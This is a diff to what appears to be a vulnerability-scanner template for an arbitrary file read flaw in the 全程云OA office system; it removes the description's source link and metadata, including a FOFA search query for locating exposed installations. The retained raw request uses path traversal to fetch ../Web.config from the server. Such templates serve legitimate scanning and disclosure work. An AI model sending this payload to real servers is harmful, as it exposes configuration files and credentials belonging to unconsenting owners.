@@ -3,12 +3,8 @@ info:
   name: 全程云OA download.ashx存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ixwbc8wsps6c9025'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ixwbc8wsps6c9025
-    fofa: product="全程云-管理系统" || body="images/yipeoplehover.png"
 http:
 - raw:
   - 'GET /OA/SMS/download.ashx?FilePath=../Web.config HTTP/1.1
